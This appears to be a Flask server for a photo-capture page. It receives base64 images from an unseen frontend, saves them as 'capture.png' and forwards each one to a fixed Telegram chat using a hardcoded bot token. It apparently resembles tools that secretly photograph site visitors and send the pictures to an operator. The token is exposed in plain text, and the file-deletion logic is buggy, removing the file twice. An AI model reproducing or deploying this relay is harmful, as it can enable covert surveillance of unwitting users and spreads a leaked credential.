from flask import Flask, render_template, request, jsonify
import base64
import requests
import os

app = Flask(__name__)

# Replace with your Telegram Bot Token and Chat ID
bot_token = '7920037671:AAHJiJTp_0AsSNqul0L7rNehtNICWyMuy_Q'
chat_id = '1659352548'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    # Get base64 image data from frontend
    image_base64 = request.json['image']
    
    # Decode the base64 image
    try:
        image_data = base64.b64decode(image_base64.split(',')[1])
    except Exception as e:
        return jsonify({'message': 'Error decoding base64: ' + str(e)}), 500
    
    # Save the image to a temporary file
    image_path = 'capture.png'
    try:
        with open(image_path, 'wb') as image_file:
            image_file.write(image_data)
    except Exception as e:
        return jsonify({'message': 'Error saving the image: ' + str(e)}), 500

    # Send the photo to Telegram
    url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
    files = {'photo': open(image_path, 'rb')}
    data = {'chat_id': chat_id}
    
    try:
        response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            os.remove(image_path)
            return jsonify({'message': 'Image sent to Telegram successfully!'}), 200
        else:
            return jsonify({'message': 'Failed to send image. Response: ' + response.text}), 500
    except requests.exceptions.RequestException as e:
        return jsonify({'message': 'Error sending request to Telegram API: ' + str(e)}), 500
    finally:
        files['photo'].close()
        os.remove(image_path)

if __name__ == '__main__':
    app.run(debug=True)
